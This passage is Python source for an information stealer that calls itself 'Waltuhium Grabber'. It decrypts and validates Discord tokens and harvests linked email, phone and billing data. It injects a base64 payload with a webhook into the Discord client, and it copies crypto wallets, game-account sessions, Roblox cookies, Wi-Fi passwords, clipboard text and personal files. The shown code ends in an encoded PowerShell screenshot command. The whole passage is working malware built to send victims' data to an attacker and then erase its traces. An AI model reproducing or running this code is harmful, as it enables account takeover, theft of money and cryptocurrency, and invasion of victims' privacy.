            r: HTTPResponse = Discord.httpClient.request("GET", "https://discord.com/api/v9/users/@me", headers= Discord.GetHeaders(token.strip()))
            if r.status == 200:
                r = r.data.decode(errors= "ignore")
                r = json.loads(r)
                user = r['username'] + '#' + str(r['discriminator'])
                id = r['id']
                email = r['email'].strip() if r['email'] else '(No Email)'
                phone = r['phone'] if r['phone'] else '(No Phone Number)'
                verified=r['verified']
                mfa = r['mfa_enabled']
                nitro_type = r.get('premium_type', 0)
                nitro_infos = {
                    0 : 'No Nitro',
                    1 : 'Nitro Classic',
                    2 : 'Nitro',
                    3 : 'Nitro Basic'
                }

                nitro_data = nitro_infos.get(nitro_type, '(Unknown)')

                billing = json.loads(Discord.httpClient.request('GET', 'https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=Discord.GetHeaders(token)).data.decode(errors= "ignore"))
                if len(billing) == 0:
                    billing = '(No Payment Method)'
                else:
                    methods = {
                        'Card' : 0,
                        'Paypal' : 0,
                        'Unknown' : 0,
                    }
                    for m in billing:
                        if not isinstance(m, dict):
                            continue
                        method_type = m.get('type', 0)

                        match method_type:
                            case 1:
                                methods['Card'] += 1
                            case 2:
                                methods['Paypal'] += 1
                            case _:
                                methods['Unknown'] += 1

                    billing = ', '.join(['{} ({})'.format(name, quantity) for name, quantity in methods.items() if quantity != 0]) or 'None'
                gifts = list()
                r = Discord.httpClient.request('GET', 'https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers= Discord.GetHeaders(token)).data.decode(errors= "ignore")
                if 'code' in r:
                    r = json.loads(r)
                    for i in r:
                        if isinstance(i, dict):
                            code = i.get('code')
                            if i.get('promotion') is None or not isinstance(i['promotion'], dict):
                                continue
                            title = i['promotion'].get('outbound_title')
                            if code and title:
                                gifts.append(f'{title}: {code}')
                if len(gifts) == 0:
                    gifts = 'Gift Codes: (NONE)'
                else:
                    gifts = 'Gift Codes:\n\t' + '\n\t'.join(gifts)
                results.append({
                    'USERNAME' : user,
                    'USERID' : id,
                    'MFA' : mfa,
                    'EMAIL' : email,
                    'PHONE' : phone,
                    'VERIFIED' : verified,
                    'NITRO' : nitro_data,
                    'BILLING' : billing,
                    'TOKEN' : token,
                    'GIFTS' : gifts
                })

        return results

    @staticmethod
    def SafeStorageSteal(path: str) -> list[str]: # Searches for tokens in the Discord client's storage directory
        encryptedTokens = list()
        tokens = list()
        key: str = None
        levelDbPaths: list[str] = list()

        localStatePath = os.path.join(path, "Local State")

        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == "leveldb":
                    levelDbPaths.append(os.path.join(root, dir))

        if os.path.isfile(localStatePath) and levelDbPaths:
            with open(localStatePath, errors= "ignore") as file:
                jsonContent: dict = json.load(file)
                
            key = jsonContent['os_crypt']['encrypted_key']
            key = base64.b64decode(key)[5:]
            
            for levelDbPath in levelDbPaths:
                for file in os.listdir(levelDbPath):
                    if file.endswith((".log", ".ldb")):
                        filepath = os.path.join(levelDbPath, file)
                        with open(filepath, errors= "ignore") as file:
                            lines = file.readlines()
                        
                        for line in lines:
                            if line.strip():
                                matches: list[str] = re.findall(Discord.REGEX_ENC, line)
                                for match in matches:
                                    match = match.rstrip("\\")
                                    if not match in encryptedTokens:
                                        match = base64.b64decode(match.split("dQw4w9WgXcQ:")[1].encode())
                                        encryptedTokens.append(match)
        
        for token in encryptedTokens:
            try:
                token = pyaes.AESModeOfOperationGCM(Syscalls.CryptUnprotectData(key), token[3:15]).decrypt(token[15:])[:-16].decode(errors= "ignore")
                if token:
                    tokens.append(token)
            except Exception:
                pass
        
        return tokens
    
    @staticmethod
    def SimpleSteal(path: str) -> list[str]: # Searches for tokens in browser's storage directory
        tokens = list()
        levelDbPaths = list()

        for root, dirs, _ in os.walk(path):
            for dir in dirs:
                if dir == "leveldb":
                    levelDbPaths.append(os.path.join(root, dir))

        for levelDbPath in levelDbPaths:
            for file in os.listdir(levelDbPath):
                if file.endswith((".log", ".ldb")):
                    filepath = os.path.join(levelDbPath, file)
                    with open(filepath, errors= "ignore") as file:
                        lines = file.readlines()
                
                    for line in lines:
                        if line.strip():
                            matches: list[str] = re.findall(Discord.REGEX, line.strip())
                            for match in matches:
                                match = match.rstrip("\\")
                                if not match in tokens:
                                    tokens.append(match)
        
        return tokens
    
    @staticmethod
    def FireFoxSteal(path: str) -> list[str]: # Searches for tokens in Firefox browser's storage directory
        tokens = list()

        for root, _, files in os.walk(path):
                for file in files:
                    if file.lower().endswith(".sqlite"):
                        filepath = os.path.join(root, file)
                        with open(filepath, errors= "ignore") as file:
                            lines = file.readlines()
                
                            for line in lines:
                                if line.strip():
                                    matches: list[str] = re.findall(Discord.REGEX, line)
                                    for match in matches:
                                        match = match.rstrip("\\")
                                        if not match in tokens:
                                            tokens.append(match)

        return tokens
    
    @staticmethod
    def InjectJs() -> str | None: # Injects javascript into the Discord client's file
        check = False
        try:
            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Settings.C2[1].encode()).decode(errors= "ignore")))
        except Exception:
            return None
        
        for dirname in ('Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'):
            path = os.path.join(os.getenv('localappdata'), dirname)
            if not os.path.isdir(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    if file.lower() == 'index.js':
                        filepath = os.path.realpath(os.path.join(root, file))
                        if os.path.split(os.path.dirname(filepath))[-1] == 'discord_desktop_core':
                            with open(filepath, 'w', encoding= 'utf-8') as file:
                                file.write(code)
                            check = True
            if check:
                check = False
                yield path

class WaltuhiumGrabber:

    Separator: str = None # Separator for separating different entries in plaintext files
    TempFolder: str = None # Temporary folder for storing data while collecting
    ArchivePath: str = None # Path of the archive to be made after all the data is collected

    Cookies: list = [] # List of cookies collected
    PasswordsCount: int = 0 # Number of passwords collected
    HistoryCount: int = 0 # Number of history collected
    AutofillCount: int = 0 # Number of autofill data collected
    RobloxCookiesCount: int = 0 # Number of Roblox cookies collected
    DiscordTokensCount: int = 0 # Number of Discord tokens collected
    WifiPasswordsCount: int = 0 # Number of WiFi passwords collected
    MinecraftSessions: int = 0 # Number of Minecraft session files collected
    WebcamPicturesCount: int = 0 # Number of webcam snapshots collected
    TelegramSessionsCount: int = 0 # Number of Telegram sessions collected
    CommonFilesCount: int = 0 # Number of files collected
    WalletsCount: int = 0 # Number of different crypto wallets collected
    ScreenshotTaken: bool = False # Indicates whether screenshot was collected or not
    SystemInfoStolen: bool = False # Indicates whether system info was collected or not
    SteamStolen: bool = False # Indicates whether Steam account was stolen or not
    EpicStolen: bool = False # Indicates whether Epic Games account was stolen or not
    UplayStolen: bool = False # Indicates whether Uplay account was stolen or not
    GrowtopiaStolen: bool = False # Indicates whether Growtopia account was stolen or not

    def __init__(self) -> None: # Constructor to call all the functions
        self.Separator = "\n\n" + "Waltuhium Grabber".center(50, "=") + "\n\n" # Sets the value of the separator
        
        while True:
            self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomString() + ".zip") # Sets the archive path
            if not os.path.isfile(self.ArchivePath):
                break

        Logger.info("Creating temporary folder")
        while True:
            self.TempFolder = os.path.join(os.getenv("temp"), Utility.GetRandomString(10, True))
            if not os.path.isdir(self.TempFolder):
                os.makedirs(self.TempFolder, exist_ok= True)
                break
        
        for func, daemon in (
            (self.StealBrowserData, False),
            (self.StealDiscordTokens, False),
            (self.StealTelegramSessions, False),
            (self.StealWallets, False),
            (self.StealMinecraft, False),
            (self.StealEpic, False),
            (self.StealGrowtopia, False),
            (self.StealSteam, False),
            (self.StealUplay, False),
            (self.GetAntivirus, False),
            (self.GetClipboard, False),
            (self.GetTaskList, False),
            (self.GetDirectoryTree, False),
            (self.GetWifiPasswords, False),
            (self.StealSystemInfo, False),
            (self.BlockSites, False),
            (self.TakeScreenshot, True),
            (self.Webshot, True),
            (self.StealCommonFiles, True)
        ):
            thread = Thread(target= func, daemon= daemon)
            thread.start()
            Tasks.AddTask(thread) # Adds all the threads to the task queue
        
        Tasks.WaitForAll() # Wait for all the tasks to complete
        Logger.info("All functions ended")
        if Errors.errors: # If there were any errors during the process, then save the error messages into a file
            with open(os.path.join(self.TempFolder, "Errors.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                file.write("# This file contains the errors handled successfully during the functioning of the stealer." + "\n\n" + "=" * 50 + "\n\n" + ("\n\n" + "=" * 50 + "\n\n").join(Errors.errors))
        self.SendData() # Send all the data to the webhook
        try:
            Logger.info("Removing archive")
            os.remove(self.ArchivePath) # Remove the archive from the system
            Logger.info("Removing temporary folder")
            shutil.rmtree(self.TempFolder) # Remove the temporary folder from the system
        except Exception:
            pass
    
    @Errors.Catch
    def StealCommonFiles(self) -> None: # Steals common files from the system
        if Settings.CaptureCommonFiles:
            for name, dir in (
                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
            ):
                if os.path.isdir(dir):
                    file: str
                    for file in os.listdir(dir):
                        if os.path.isfile(os.path.join(dir, file)):
                            if (any([x in file.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                                or file.endswith((".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx"))) \
                                and os.path.getsize(os.path.join(dir, file)) < 2 * 1024 * 1024: # File less than 2 MB
                                try:
                                    os.makedirs(os.path.join(self.TempFolder, "Common Files", name), exist_ok= True)
                                    shutil.copy(os.path.join(dir, file), os.path.join(self.TempFolder, "Common Files", name, file))
                                    self.CommonFilesCount += 1
                                except Exception:
                                    pass

    @Errors.Catch
    def StealMinecraft(self) -> None: # Steals Minecraft session files
        if Settings.CaptureGames:
            Logger.info("Stealing Minecraft related files")
            saveToPath = os.path.join(self.TempFolder, "Games", "Minecraft")
            userProfile = os.getenv("userprofile")
            roaming = os.getenv("appdata")
            minecraftPaths = {
                 "Intent" : os.path.join(userProfile, "intentlauncher", "launcherconfig"),
                 "Lunar" : os.path.join(userProfile, ".lunarclient", "settings", "game", "accounts.json"),
                 "TLauncher" : os.path.join(roaming, ".minecraft", "TlauncherProfiles.json"),
                 "Feather" : os.path.join(roaming, ".feather", "accounts.json"),
                 "Meteor" : os.path.join(roaming, ".minecraft", "meteor-client", "accounts.nbt"),
                 "Impact" : os.path.join(roaming, ".minecraft", "Impact", "alts.json"),
                 "Novoline" : os.path.join(roaming, ".minectaft", "Novoline", "alts.novo"),
                 "CheatBreakers" : os.path.join(roaming, ".minecraft", "cheatbreaker_accounts.json"),
                 "Microsoft Store" : os.path.join(roaming, ".minecraft", "launcher_accounts_microsoft_store.json"),
                 "Rise" : os.path.join(roaming, ".minecraft", "Rise", "alts.txt"),
                 "Rise (Intent)" : os.path.join(userProfile, "intentlauncher", "Rise", "alts.txt"),
                 "Paladium" : os.path.join(roaming, "paladium-group", "accounts.json"),
                 "PolyMC" : os.path.join(roaming, "PolyMC", "accounts.json"),
                 "Badlion" : os.path.join(roaming, "Badlion Client", "accounts.json"),
            }

            for name, path in minecraftPaths.items():
                if os.path.isfile(path):
                    try:
                        os.makedirs(os.path.join(saveToPath, name), exist_ok= True)
                        shutil.copy(path, os.path.join(saveToPath, name, os.path.basename(path)))
                        self.MinecraftSessions += 1
                    except Exception:
                        continue
    
    @Errors.Catch
    def StealGrowtopia(self) -> None: # Steals Growtopia session files
        if Settings.CaptureGames:
            Logger.info("Stealing Growtopia session")

            growtopiadirs = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Growtopia")] if x is not None])]
            saveToPath = os.path.join(self.TempFolder, "Games", "Growtopia")
            multiple = len(growtopiadirs) > 1

            for index, path in enumerate(growtopiadirs):
                targetFilePath = os.path.join(path, "save.dat")
                if os.path.isfile(targetFilePath):
                    try:
                        _saveToPath = saveToPath
                        if multiple:
                            _saveToPath = os.path.join(saveToPath, "Profile %d" % (index + 1))
                        os.makedirs(_saveToPath, exist_ok= True)
                        shutil.copy(targetFilePath, os.path.join(_saveToPath, "save.dat"))
                        self.GrowtopiaStolen = True
                    except Exception:
                        shutil.rmtree(_saveToPath)
            
            if multiple and self.GrowtopiaStolen:
                with open(os.path.join(saveToPath, "Info.txt"), "w") as file:
                    file.write("Multiple Growtopia installations are found, so the files for each of them are put in different Profiles")
                    
    @Errors.Catch
    def StealEpic(self) -> None: #Steals Epic accounts
        if Settings.CaptureGames:
            Logger.info("Stealing Epic session")
            saveToPath = os.path.join(self.TempFolder, "Games", "Epic")
            epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
            if os.path.isdir(epicPath):
                loginFile = os.path.join(epicPath, "GameUserSettings.ini") #replace this file to login to epic client
                if os.path.isfile(loginFile):
                    with open(loginFile) as file:
                        contents = file.read()
                    if "[RememberMe]" in contents:
                        try:
                            os.makedirs(saveToPath, exist_ok= True)
                            for file in os.listdir(epicPath):
                                if os.path.isfile(os.path.join(epicPath, file)):
                                    shutil.copy(os.path.join(epicPath, file), os.path.join(saveToPath, file))
                            shutil.copytree(epicPath, saveToPath, dirs_exist_ok= True)
                            self.EpicStolen = True
                        except Exception:
                            pass
    
    @Errors.Catch
    def StealSteam(self) -> None: # Steals Steam accounts
        if Settings.CaptureGames:
            Logger.info("Stealing Steam session")
            saveToPath = os.path.join(self.TempFolder, "Games", "Steam")
            steamPaths  = [*set([os.path.dirname(x) for x in [Utility.GetLnkTarget(v) for v in Utility.GetLnkFromStartMenu("Steam")] if x is not None])]
            multiple = len(steamPaths) > 1

            if not steamPaths:
                steamPaths.append("C:\\Program Files (x86)\\Steam")
            
            for index, steamPath in enumerate(steamPaths):
                steamConfigPath = os.path.join(steamPath, "config")
                if os.path.isdir(steamConfigPath):
                    loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
                    if os.path.isfile(loginFile):
                        with open(loginFile) as file:
                            contents = file.read()
                        if '"RememberPassword"\t\t"1"' in contents:
                            try:
                                _saveToPath = saveToPath
                                if multiple:
                                    _saveToPath = os.path.join(saveToPath, "Profile %d" % (index + 1))
                                os.makedirs(_saveToPath, exist_ok= True)
                                shutil.copytree(steamConfigPath, os.path.join(_saveToPath, "config"), dirs_exist_ok= True)
                                for item in os.listdir(steamPath):
                                    if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
                                        shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                                        self.SteamStolen = True
                            except Exception:
                                pass
            if self.SteamStolen and multiple:
                with open(os.path.join(saveToPath, "Info.txt"), "w") as file:
                    file.write("Multiple Steam installations are found, so the files for each of them are put in different Profiles")
    
    @Errors.Catch
    def StealUplay(self) -> None: # Steals Uplay accounts
        if Settings.CaptureGames:
            Logger.info("Stealing Uplay session")
            saveToPath = os.path.join(self.TempFolder, "Games", "Uplay")
            uplayPath = os.path.join(os.getenv("localappdata"), "Ubisoft Game Launcher")
            if os.path.isdir(uplayPath):
                for item in os.listdir(uplayPath):
                    if os.path.isfile(os.path.join(uplayPath, item)):
                        os.makedirs(saveToPath, exist_ok= True)
                        shutil.copy(os.path.join(uplayPath, item), os.path.join(saveToPath, item))
                        self.UplayStolen = True
    
    @Errors.Catch
    def StealRobloxCookies(self) -> None: # Steals Roblox cookies
        if Settings.CaptureGames:
            Logger.info("Stealing Roblox cookies")
            saveToDir = os.path.join(self.TempFolder, "Games", "Roblox")
            note = "# The cookies found in this text file have not been verified online. \n# Therefore, there is a possibility that some of them may work, while others may not."
            cookies = []

            browserCookies = "\n".join(self.Cookies)
            for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", browserCookies):
                cookies.append(match)
        
            output = list()
            for item in ('HKCU', 'HKLM'):
                process = subprocess.run("powershell Get-ItemPropertyValue -Path {}:SOFTWARE\\Roblox\\RobloxStudioBrowser\\roblox.com -Name .ROBLOSECURITY".format(item), capture_output= True, shell= True)
                if not process.returncode:
                    output.append(process.stdout.decode(errors= "ignore"))
        
            for match in re.findall(r"_\|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_[A-Z0-9]+", "\n".join(output)):
                cookies.append(match)
        
            cookies = [*set(cookies)] # Removes duplicates

            if cookies:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Roblox Cookies.txt"), "w") as file:
                    file.write("{}{}{}".format(note, self.Separator, self.Separator.join(cookies)))
                self.RobloxCookiesCount += len(cookies)
    
    @Errors.Catch
    def StealWallets(self) -> None: # Steals crypto wallets
        if Settings.CaptureWallets:
            Logger.info("Stealing crypto wallets")
            saveToDir = os.path.join(self.TempFolder, "Wallets")

            wallets = (
                ("Zcash", os.path.join(os.getenv("appdata"), "Zcash")),
                ("Armory", os.path.join(os.getenv("appdata"), "Armory")),
                ("Bytecoin", os.path.join(os.getenv("appdata"), "Bytecoin")),
                ("Jaxx", os.path.join(os.getenv("appdata"), "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb")),
                ("Exodus", os.path.join(os.getenv("appdata"), "Exodus", "exodus.wallet")),
                ("Ethereum", os.path.join(os.getenv("appdata"), "Ethereum", "keystore")),
                ("Electrum", os.path.join(os.getenv("appdata"), "Electrum", "wallets")),
                ("AtomicWallet", os.path.join(os.getenv("appdata"), "atomic", "Local Storage", "leveldb")),
                ("Guarda", os.path.join(os.getenv("appdata"), "Guarda", "Local Storage", "leveldb")),
                ("Coinomi", os.path.join(os.getenv("localappdata"), "Coinomi", "Coinomi", "wallets")),
            )

            browserPaths = {
                "Brave" : os.path.join(os.getenv("localappdata"), "BraveSoftware", "Brave-Browser", "User Data"),
                "Chrome" : os.path.join(os.getenv("localappdata"), "Google", "Chrome", "User Data"),
                "Chromium" : os.path.join(os.getenv("localappdata"), "Chromium", "User Data"),
                "Comodo" : os.path.join(os.getenv("localappdata"), "Comodo", "Dragon", "User Data"),
                "Edge" : os.path.join(os.getenv("localappdata"), "Microsoft", "Edge", "User Data"),
                "EpicPrivacy" : os.path.join(os.getenv("localappdata"), "Epic Privacy Browser", "User Data"),
                "Iridium" : os.path.join(os.getenv("localappdata"), "Iridium", "User Data"),
                "Opera" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera Stable"),
                "Opera GX" : os.path.join(os.getenv("appdata"), "Opera Software", "Opera GX Stable"),
                "Slimjet" : os.path.join(os.getenv("localappdata"), "Slimjet", "User Data"),
                "UR" : os.path.join(os.getenv("localappdata"), "UR Browser", "User Data"),
                "Vivaldi" : os.path.join(os.getenv("localappdata"), "Vivaldi", "User Data"),
                "Yandex" : os.path.join(os.getenv("localappdata"), "Yandex", "YandexBrowser", "User Data")
            }

            for name, path in wallets:
                if os.path.isdir(path):
                    _saveToDir = os.path.join(saveToDir, name)
                    os.makedirs(_saveToDir, exist_ok= True)
                    try:
                        shutil.copytree(path, os.path.join(_saveToDir, os.path.basename(path)), dirs_exist_ok= True)
                        with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
                            file.write(path)
                        self.WalletsCount += 1
                    except Exception:
                        try:
                            shutil.rmtree(_saveToDir)
                        except Exception:
                            pass
            
            for name, path in browserPaths.items():
                    if os.path.isdir(path):
                        for root, dirs, _ in os.walk(path):
                            for _dir in dirs:
                                if _dir == "Local Extension Settings":
                                    localExtensionsSettingsDir = os.path.join(root, _dir)
                                    for _dir in ("ejbalbakoplchlghecdalmeeeajnimhm", "nkbihfbeogaeaoehlefnkodbefgpgknn"):
                                        extentionPath = os.path.join(localExtensionsSettingsDir, _dir)
                                        if os.path.isdir(extentionPath) and os.listdir(extentionPath):
                                            try:
                                                metamask_browser = os.path.join(saveToDir, "Metamask ({})".format(name))
                                                _saveToDir =  os.path.join(metamask_browser, _dir)
                                                shutil.copytree(extentionPath, _saveToDir, dirs_exist_ok= True)
                                                with open(os.path.join(_saveToDir, "Location.txt"), "w") as file:
                                                    file.write(extentionPath)
                                                self.WalletsCount += 1
                                            except Exception: # Permission Denied
                                                try:
                                                    shutil.rmtree(_saveToDir)
                                                    if not os.listdir(metamask_browser):
                                                        shutil.rmtree(metamask_browser)
                                                except Exception: pass
    
    @Errors.Catch
    def StealSystemInfo(self) -> None: # Steals system information
        if Settings.CaptureSystemInfo:
            Logger.info("Stealing system information")
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("systeminfo", capture_output= True, shell= True)
            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
            if output:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "System Info.txt"), "w") as file:
                    file.write(output)
                self.SystemInfoStolen = True
            
            process = subprocess.run("getmac", capture_output= True, shell= True)
            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
            if output:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "MAC Addresses.txt"), "w") as file:
                    file.write(output)
                self.SystemInfoStolen = True
        
    @Errors.Catch
    def GetDirectoryTree(self) -> None: # Makes directory trees of the common directories
        if Settings.CaptureSystemInfo:
            Logger.info("Getting directory trees")

            PIPE      = chr(9474) + "   "
            TEE       = "".join(chr(x) for x in (9500, 9472, 9472)) + " "
            ELBOW     = "".join(chr(x) for x in (9492, 9472, 9472)) + " "
        
            output = {}
            for name, dir in (
                ("Desktop", os.path.join(os.getenv("userprofile"), "Desktop")),
                ("Pictures", os.path.join(os.getenv("userprofile"), "Pictures")),
                ("Documents", os.path.join(os.getenv("userprofile"), "Documents")),
                ("Music", os.path.join(os.getenv("userprofile"), "Music")),
                ("Videos", os.path.join(os.getenv("userprofile"), "Videos")),
                ("Downloads", os.path.join(os.getenv("userprofile"), "Downloads")),
            ):
                if os.path.isdir(dir):
                    dircontent: list = os.listdir(dir)
                    if 'desltop.ini' in dircontent:
                        dircontent.remove('desktop.ini')
                    if dircontent:
                        process = subprocess.run("tree /A /F", shell= True, capture_output= True, cwd= dir)
                        if process.returncode == 0:
                            output[name] = (name + "\n" + "\n".join(process.stdout.decode(errors= "ignore").splitlines()[3:])).replace("|   ", PIPE).replace("+---", TEE).replace("\---", ELBOW)

            for key, value in output.items():
                os.makedirs(os.path.join(self.TempFolder, "Directories"), exist_ok= True)
                with open(os.path.join(self.TempFolder, "Directories", "{}.txt".format(key)), "w", encoding= "utf-8") as file:
                    file.write(value)
                self.SystemInfoStolen = True
    
    @Errors.Catch
    def GetClipboard(self) -> None: # Copies text from the clipboard
        if Settings.CaptureSystemInfo:
            Logger.info("Getting clipboard text")
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True)
            if process.returncode == 0:
                content = process.stdout.decode(errors= "ignore").strip()
                if content:
                    os.makedirs(saveToDir, exist_ok= True)
                    with open(os.path.join(saveToDir, "Clipboard.txt"), "w", encoding= "utf-8") as file:
                        file.write(content)
    
    @Errors.Catch
    def GetAntivirus(self) -> None: # Finds what antivirus(es) are installed in the system
        if Settings.CaptureSystemInfo:
            Logger.info("Getting antivirus")
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName", shell= True, capture_output= True)
            if process.returncode == 0:
                output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n").splitlines()
                if len(output) >= 2:
                    output = output[1:]
                    os.makedirs(saveToDir, exist_ok= True)
                    with open(os.path.join(saveToDir, "Antivirus.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                        file.write("\n".join(output))
    
    @Errors.Catch
    def GetTaskList(self) -> None: # Gets list of processes currently running in the system
        if Settings.CaptureSystemInfo:
            Logger.info("Getting task list")
            saveToDir = os.path.join(self.TempFolder, "System")

            process = subprocess.run("tasklist /FO LIST", capture_output= True, shell= True)
            output = process.stdout.decode(errors= "ignore").strip().replace("\r\n", "\n")
            if output:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Task List.txt"), "w", errors= "ignore") as tasklist:
                    tasklist.write(output)
    
    @Errors.Catch
    def GetWifiPasswords(self) -> None: # Saves WiFi passwords stored in the system
        if Settings.CaptureWifiPasswords:
            Logger.info("Getting wifi passwords")
            saveToDir = os.path.join(self.TempFolder, "System")
            passwords = Utility.GetWifiPasswords()
            profiles = list()
            for profile, psw in passwords.items():
                profiles.append(f"Network: {profile}\nPassword: {psw}")
            if profiles:
                os.makedirs(saveToDir, exist_ok= True)
                with open(os.path.join(saveToDir, "Wifi Networks.txt"), "w", encoding= "utf-8", errors= "ignore") as file:
                    file.write(self.Separator.lstrip() + self.Separator.join(profiles))
                self.WifiPasswordsCount += len(profiles)
    
    @Errors.Catch
    def TakeScreenshot(self) -> None: # Takes screenshot(s) of all the monitors of the system
        if Settings.CaptureScreenshot:
            Logger.info("Taking screenshot")
            command = "JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAA